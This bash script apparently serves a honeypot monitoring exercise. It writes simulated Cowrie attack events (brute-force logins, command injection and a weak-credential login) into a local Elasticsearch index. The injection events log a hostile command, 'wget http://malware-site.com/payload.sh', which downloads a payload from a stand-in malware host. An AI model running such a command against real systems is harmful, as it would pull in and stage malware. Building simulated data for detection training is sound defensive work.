#!/bin/bash

echo "Sending simulated Week 2 attacks..."

INDEX="honeypot-$(date +%Y.%m.%d)"

# -------------------------
# China Brute Force Attacks
# -------------------------
for i in 1 2 3 4 5; do
  curl -s -X POST "http://localhost:9200/$INDEX/_doc" \
    -H "Content-Type: application/json" \
    -d "{
      \"@timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.000Z)\",
      \"eventid\":\"cowrie.login.failed\",
      \"attack_type\":\"bruteforce\",
      \"src_ip\":\"45.125.66.$i\",
      \"country\":\"China\",
      \"username\":\"admin\",
      \"password\":\"12345$i\",
      \"message\":\"Failed login attempt from China\"
    }"
  sleep 1
done

# -------------------------
# Russia Command Injection
# -------------------------
for i in 1 2 3; do
  curl -s -X POST "http://localhost:9200/$INDEX/_doc" \
    -H "Content-Type: application/json" \
    -d "{
      \"@timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.000Z)\",
      \"eventid\":\"cowrie.command.input\",
      \"attack_type\":\"command_injection\",
      \"src_ip\":\"185.220.101.$i\",
      \"country\":\"Russia\",
      \"input\":\"wget http://malware-site.com/payload.sh\",
      \"message\":\"Malware download attempt\"
    }"
  sleep 1
done

# -------------------------
# USA Successful Login
# -------------------------
curl -s -X POST "http://localhost:9200/$INDEX/_doc" \
  -H "Content-Type: application/json" \
  -d "{
    \"@timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.000Z)\",
    \"eventid\":\"cowrie.login.success\",
    \"attack_type\":\"credential_theft\",
    \"src_ip\":\"192.168.1.100\",
    \"country\":\"USA\",
    \"username\":\"nurse\",
    \"password\":\"nurse\",
    \"message\":\"Successful login with weak credentials\"
  }"

echo ""
echo "Week 2 attack simulation complete."
